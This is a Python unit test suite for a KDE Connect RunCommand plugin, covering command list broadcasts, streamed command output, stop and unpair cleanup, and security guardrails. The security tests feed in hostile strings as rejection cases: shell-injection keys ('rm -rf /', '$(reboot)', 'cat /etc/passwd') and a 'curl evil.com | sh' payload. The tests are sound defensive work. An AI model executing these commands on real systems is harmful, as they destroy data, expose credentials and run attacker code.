"""tests.unit.test_plugin_runcommand
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Unit test suite for KDE Connect RunCommand host plugin (pengulink.plugins.runcommand):
- Plugin metadata, capability advertisement, and lifecycle hooks
- Initial commandList broadcast upon DeviceConnected
- requestCommandList query and stringified JSON payload (Android requirement)
- Safe command execution streaming 3-phase output (commandStarted, commandOutput, commandFinished)
- Strict security guardrails: rejection of unknown keys, rejection of remote command strings
- Stop packet handling and process group termination
- Peer isolation, pairing authentication checks, and unpair cleanup.
"""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any

from pengulink.core.events import (
    DeviceConnected,
    DeviceDisconnected,
    DeviceUnpaired,
    EventBus,
)
from pengulink.network.packet import Packet
from pengulink.plugins.runcommand import (
    REMOTE_FORCE_COMMAND_TYPE,
    RUNCOMMAND_OUTPUT_TYPE,
    RUNCOMMAND_PACKET_TYPE,
    RUNCOMMAND_REQUEST_TYPE,
    RunCommandPlugin,
)
from pengulink.services.command import (
    CommandStore,
    LocalCommandService,
)


def _make_request_packet(body: dict[str, Any] | None = None) -> Packet:
    return Packet(type=RUNCOMMAND_REQUEST_TYPE, body=body or {})


# =============================================================================
# Test Plugin Metadata & Lifecycle
# =============================================================================


class TestRunCommandPluginMetadataAndLifecycle:
    """Tests for RunCommandPlugin capabilities, subscriptions, and teardown."""

    def test_metadata_and_capabilities(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        assert plugin.plugin_id == "runcommand"
        assert RUNCOMMAND_REQUEST_TYPE in plugin.incoming_capabilities
        assert REMOTE_FORCE_COMMAND_TYPE in plugin.incoming_capabilities
        assert RUNCOMMAND_PACKET_TYPE in plugin.outgoing_capabilities
        assert RUNCOMMAND_OUTPUT_TYPE in plugin.outgoing_capabilities

    async def test_lifecycle_subscriptions_and_teardown(self, tmp_path: Path) -> None:
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(event_bus=bus, command_store=store)

        await plugin.start()
        assert len(plugin._unsub_callbacks) == 3

        # Simulate connected peer
        plugin._connected_peers["peer_1"] = lambda pkt: None
        assert "peer_1" in plugin._connected_peers

        await plugin.stop()
        assert len(plugin._unsub_callbacks) == 0
        assert len(plugin._connected_peers) == 0


# =============================================================================
# Test Command List Advertisement & Queries
# =============================================================================


class TestRunCommandPluginAdvertisement:
    """Tests for command list broadcasting and requestCommandList queries."""

    async def test_on_device_connected_broadcasts_stringified_json(
        self, tmp_path: Path
    ) -> None:
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Lock Screen", command="loginctl lock-session", key="cmd_lock"
        )
        plugin = RunCommandPlugin(event_bus=bus, command_store=store)
        await plugin.start()

        sent_packets: list[Packet] = []

        async def mock_sender(pkt: Packet) -> None:
            sent_packets.append(pkt)

        plugin._connected_peers["peer_abc"] = mock_sender

        # Trigger DeviceConnected
        await bus.publish(
            DeviceConnected(device_id="peer_abc", device_name="Test Phone")
        )

        assert len(sent_packets) == 1
        pkt = sent_packets[0]
        assert pkt.type == RUNCOMMAND_PACKET_TYPE
        assert pkt.body["canAddCommand"] is True

        # Android Invariant: commandList must be a JSON string
        raw_list = pkt.body["commandList"]
        assert isinstance(raw_list, str)
        parsed = json.loads(raw_list)
        assert "cmd_lock" in parsed
        assert parsed["cmd_lock"]["name"] == "Lock Screen"
        assert parsed["cmd_lock"]["command"] == "loginctl lock-session"

        await plugin.stop()

    async def test_request_command_list_query(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Date", command="date", key="cmd_date")
        plugin = RunCommandPlugin(command_store=store)

        sent_packets: list[Packet] = []

        async def mock_sender(pkt: Packet) -> None:
            sent_packets.append(pkt)

        query_pkt = _make_request_packet({"requestCommandList": True})
        await plugin.handle_packet(
            query_pkt, device_id="peer_1", send_packet=mock_sender
        )

        assert len(sent_packets) == 1
        reply = sent_packets[0]
        assert reply.type == RUNCOMMAND_PACKET_TYPE
        assert reply.body.get("canAddCommand") is True
        raw_list = reply.body.get("commandList")
        assert isinstance(raw_list, str)
        parsed = json.loads(raw_list)
        assert "cmd_date" in parsed

    async def test_broadcast_command_list_to_multiple_peers(
        self, tmp_path: Path
    ) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        peer1_packets: list[Packet] = []
        peer2_packets: list[Packet] = []

        plugin._connected_peers["peer1"] = lambda p: peer1_packets.append(p)
        plugin._connected_peers["peer2"] = lambda p: peer2_packets.append(p)

        await plugin.broadcast_command_list()

        assert len(peer1_packets) == 1
        assert len(peer2_packets) == 1
        assert peer1_packets[0].type == RUNCOMMAND_PACKET_TYPE
        assert peer2_packets[0].type == RUNCOMMAND_PACKET_TYPE


# =============================================================================
# Test Command Execution & 3-Phase Streaming Output
# =============================================================================


class TestRunCommandPluginExecutionStreaming:
    """Tests for 3-phase output packets (commandStarted, commandOutput, commandFinished)."""

    async def test_nominal_execution_emits_three_phases(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        cmd_str = (
            f"{sys.executable} -c 'print(\"stdout_test\"); import sys; sys.exit(0)'"
        )
        store.add_command(name="Test Cmd", command=cmd_str, key="cmd_nominal")

        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent_packets: list[Packet] = []

        async def mock_sender(pkt: Packet) -> None:
            sent_packets.append(pkt)

        req_pkt = _make_request_packet({"key": "cmd_nominal"})
        await plugin.handle_packet(req_pkt, device_id="peer_1", send_packet=mock_sender)

        # Allow async execution to complete
        await asyncio.sleep(0.3)

        # Verify output packets received
        assert len(sent_packets) >= 2  # At least started + finished

        # Phase A: commandStarted
        started_pkts = [
            p
            for p in sent_packets
            if p.body.get("commandStarted") is True
            and p.body.get("key") == "cmd_nominal"
        ]
        assert len(started_pkts) == 1
        assert started_pkts[0].body["command"] == cmd_str
        assert "id" in started_pkts[0].body

        # Phase B: commandOutput
        output_pkts = [
            p
            for p in sent_packets
            if p.body.get("commandOutput") is True
            and p.body.get("key") == "cmd_nominal"
        ]
        if output_pkts:
            assert any(
                "stdout_test" in line for line in output_pkts[0].body.get("stdout", [])
            )

        # Phase C: commandFinished
        finished_pkts = [
            p
            for p in sent_packets
            if p.body.get("commandFinished") is True
            and p.body.get("key") == "cmd_nominal"
        ]
        assert len(finished_pkts) == 1
        assert finished_pkts[0].body["success"] is True
        assert finished_pkts[0].body["exitCode"] == 0
        assert "stdout_test" in finished_pkts[0].body.get("output", "")

    async def test_failing_command_emits_finished_with_failure(
        self, tmp_path: Path
    ) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        cmd_str = f"{sys.executable} -c 'import sys; sys.exit(42)'"
        store.add_command(name="Fail Cmd", command=cmd_str, key="cmd_fail")

        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent_packets: list[Packet] = []

        req_pkt = _make_request_packet({"key": "cmd_fail"})
        await plugin.handle_packet(
            req_pkt,
            device_id="peer_1",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.3)

        finished_pkts = [
            p for p in sent_packets if p.body.get("commandFinished") is True
        ]
        assert len(finished_pkts) == 1
        assert finished_pkts[0].body["success"] is False
        assert finished_pkts[0].body["exitCode"] == 42


# =============================================================================
# Test Security Guardrails
# =============================================================================


class TestRunCommandPluginSecurity:
    """Tests verifying rejection of unknown keys, remote payloads, and unauthenticated peers."""

    async def test_rejection_of_unknown_key(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent_packets: list[Packet] = []

        req_pkt = _make_request_packet({"key": "unknown_key_99999"})
        await plugin.handle_packet(
            req_pkt,
            device_id="peer_1",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.1)
        assert len(sent_packets) == 0

    async def test_rejection_of_shell_metacharacters_in_key(
        self, tmp_path: Path
    ) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Lock", command="loginctl lock", key="cmd_lock")
        plugin = RunCommandPlugin(command_store=store)

        sent_packets: list[Packet] = []

        injections = [
            "cmd_lock; rm -rf /",
            "cmd_lock && whoami",
            "`id`",
            "$(reboot)",
            "cmd_lock | cat /etc/passwd",
        ]
        for inj in injections:
            req_pkt = _make_request_packet({"key": inj})
            await plugin.handle_packet(
                req_pkt,
                device_id="peer_1",
                send_packet=lambda p: sent_packets.append(p),
            )

        await asyncio.sleep(0.1)
        # None of the injection keys match the dictionary key "cmd_lock"
        assert len(sent_packets) == 0

    async def test_remote_command_string_payload_unconditionally_ignored(
        self, tmp_path: Path
    ) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent_packets: list[Packet] = []

        # Rogue packet attempting to supply command string
        rogue_pkt = Packet(
            type=RUNCOMMAND_REQUEST_TYPE,
            body={
                "command": "curl evil.com | sh",
                "cmd": "rm -rf /",
            },
        )
        await plugin.handle_packet(
            rogue_pkt,
            device_id="peer_1",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.1)
        assert len(sent_packets) == 0

    async def test_unpaired_device_packet_dropped(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Lock", command="echo 1", key="cmd_lock")

        # Mock pairing checker that marks all devices as unpaired
        is_paired_checker = lambda dev_id: False

        plugin = RunCommandPlugin(
            command_store=store, is_paired_checker=is_paired_checker
        )

        sent_packets: list[Packet] = []

        req_pkt = _make_request_packet({"key": "cmd_lock"})
        await plugin.handle_packet(
            req_pkt,
            device_id="untrusted_peer",
            send_packet=lambda p: sent_packets.append(p),
        )

        query_pkt = _make_request_packet({"requestCommandList": True})
        await plugin.handle_packet(
            query_pkt,
            device_id="untrusted_peer",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.1)
        assert len(sent_packets) == 0


# =============================================================================
# Test Stop & Disconnect / Unpair Cleanup
# =============================================================================


class TestRunCommandPluginStopAndTeardown:
    """Tests for stop request packet and device unpair process termination."""

    async def test_stop_packet_terminates_running_process(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        py_cmd = f"{sys.executable} -c 'import time; time.sleep(30)'"
        store.add_command(name="Sleep", command=py_cmd, key="cmd_sleep")

        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent_packets: list[Packet] = []

        # 1. Trigger execution
        req_pkt = _make_request_packet({"key": "cmd_sleep"})
        await plugin.handle_packet(
            req_pkt,
            device_id="dev_1",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.15)
        # Verify command is running
        assert len(service._active_processes) >= 1

        # 2. Send stop packet
        stop_pkt = _make_request_packet({"stop": True})
        await plugin.handle_packet(
            stop_pkt,
            device_id="dev_1",
            send_packet=lambda p: sent_packets.append(p),
        )

        await asyncio.sleep(0.2)
        # Verify process has been terminated
        assert len(service._active_processes) == 0

    async def test_unpair_terminates_active_processes(self, tmp_path: Path) -> None:
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        py_cmd = f"{sys.executable} -c 'import time; time.sleep(30)'"
        store.add_command(name="Sleep", command=py_cmd, key="cmd_sleep")

        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(
            event_bus=bus, command_store=store, command_service=service
        )
        await plugin.start()

        # Trigger execution from dev_unpair
        req_pkt = _make_request_packet({"key": "cmd_sleep"})
        await plugin.handle_packet(
            req_pkt, device_id="dev_unpair", send_packet=lambda p: None
        )

        await asyncio.sleep(0.15)
        assert len(service._active_processes) >= 1

        # Publish DeviceUnpaired
        await bus.publish(DeviceUnpaired(device_id="dev_unpair"))

        await asyncio.sleep(0.2)
        assert len(service._active_processes) == 0

        await plugin.stop()

    async def test_disconnect_cleans_up_peer_sender(self, tmp_path: Path) -> None:
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(event_bus=bus, command_store=store)
        await plugin.start()

        plugin._connected_peers["dev_dc"] = lambda p: None
        assert "dev_dc" in plugin._connected_peers

        await bus.publish(DeviceDisconnected(device_id="dev_dc", reason="closed"))
        assert "dev_dc" not in plugin._connected_peers

        await plugin.stop()

    async def test_setup_packet_safe_no_op(self, tmp_path: Path) -> None:
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        setup_pkt = _make_request_packet({"setup": True})
        # Should execute safely without raising exceptions
        await plugin.handle_packet(
            setup_pkt, device_id="dev_1", send_packet=lambda p: None
        )
